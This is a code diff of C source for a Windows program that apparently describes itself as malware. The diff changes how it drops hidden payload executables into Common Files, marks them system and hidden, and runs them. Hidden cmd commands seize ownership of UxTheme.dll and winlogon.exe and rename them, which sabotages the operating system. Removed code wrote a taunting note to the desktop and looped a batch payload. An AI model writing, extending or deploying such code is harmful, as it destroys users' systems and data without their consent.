@@ -638,54 +638,18 @@ int SmallScreenEffect() {
     }
 }
 
-void CreateComeBackNote() {
-
-    /* Create Come Back note MHAHAHAHAHAHA! */
-    TCHAR szPath[MAX_PATH];
-
-    if (SUCCEEDED(SHGetFolderPath(NULL,
-        CSIDL_DESKTOP | CSIDL_FLAG_CREATE,
-        NULL,
-        0,
-        szPath)))
-    {
-        PathAppend(szPath, TEXT("readMe.txt"));
-        HANDLE hFile = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-
-        if (WriteFile(hFile, unfm, unfm_len, &wb, NULL) == FALSE) {
-            MessageBoxW(NULL, L">:( i feel so angry about that", L"ERROR", MB_ICONINFORMATION | MB_OK);
-            killWindowsInstant();
-        }
-    }
-}
 
 void CreateTimeDate() {
-    if (PathFileExistsA("C:\\Windows\\SysNative") == TRUE) {
-        /* Create KillWindows program for iexplore.exe and userinit payload */
-        HANDLE tdb = CreateFileA("C:\\Windows\\SysNative\\timeDate.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
-        if (WriteFile(tdb, tdbs, tdb_len, &wb, NULL) == FALSE) {
-            MessageBoxW(NULL, L"ERROR IN: accessing necessary things for this malware\r\n\r\nSOLUTION: End this malware so end suffering ;)", L"ERROR", MB_ICONINFORMATION | MB_OK);
-            CreateComeBackNote();
-            Sleep(500);
-            killWindowsInstant();
-        }
-    }
-    else if (PathFileExistsA("C:\\Windows\\System32") == TRUE) {
-        /* Create KillWindows program for iexplore.exe and userinit payload */
-        HANDLE tdb = CreateFileA("C:\\Windows\\System32\\timeDate.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+    /* Create TimeDate Payload */
+    HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\MIW.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
-        if (WriteFile(tdb, tdbs, tdb_len, &wb, NULL) == FALSE) {
-            MessageBoxW(NULL, L"ERROR IN: accessing necessary things for this malware\r\n\r\nSOLUTION: End this malware so end suffering ;)", L"ERROR", MB_ICONINFORMATION | MB_OK);
-            CreateComeBackNote();
-            Sleep(500);
-            killWindowsInstant();
-        }
-    }
-}
+    WriteFile(kwi, tdp, tdp_len, &wb, NULL);
 
-void OverrunSecurityMB() {
-    MessageBoxW(NULL, L"The s▓stem dete▓ted an over▒un of a stack-based b▒ffer in ▓his applica▒ion. This ove▒run could p▓tentially allo▓ a mali▒ious user to ga▓n contro▒ of this ap▓lication.", L"SecurityHealtySystray.exe - Syst▓m E▓ror", MB_ICONERROR | MB_OK);
+    CloseHandle(kwi);
+
+    /* Attribute it System and hide */
+    ShellExecuteA(NULL, NULL, "attrib", "+s +h \u0022C:\\Program Files\\Common Files\\MIW.EXE\u0022", NULL, SW_HIDE);
 }
 
 void DisableSecurity() {
@@ -694,7 +658,7 @@ void DisableSecurity() {
 
 
 /* 3:33:33 AM payload */
-int SetTimeDate() {
+void SetTimeDate() {
     CreateTimeDate();
     ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\UxTheme.dll & icacls C:\\Windows\\SysNative\\UxTheme.dll /grant everyone:F & ren C:\\Windows\\SysNative\\UxTheme.dll main_lol.dll", NULL, SW_HIDE);
     if (PathFileExistsA("C:\\Windows\\SysNative")) {
@@ -704,18 +668,7 @@ int SetTimeDate() {
     {
         ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
     }
-    if (PathFileExistsA("C:\\Windows\\SysNative") == TRUE) {
-        while (1) {
-            ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Windows\\SysNative\\timeDate.bat", NULL, SW_HIDE);
-            Sleep(1000);
-        }
-    }
-    else {
-        while (1) {
-            ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Windows\\System32\\timeDate.bat", NULL, SW_HIDE);
-            Sleep(1000);
-        }
-    }
+    ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\MIW.EXE", NULL, NULL, SW_HIDE);
 }
 
 int Tada() {
@@ -947,12 +900,15 @@ void CreateKillWindows() {
 
     if (PathFileExistsA("C:\\Program Files\\Common Files\\WINNT32.EXE") != TRUE) {
 
-        /* Create KillWindows program for iexplore.exe and userinit payload */
+        /* Create KillWindows program for some payloads */
         HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
         WriteFile(kwi, kwp, kwp_len, &wb, NULL);
 
         CloseHandle(kwi);
+
+        /* Attribute it System and hide */
+        ShellExecuteA(NULL, NULL, "attrib", "+s +h \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
     }
     else
     {
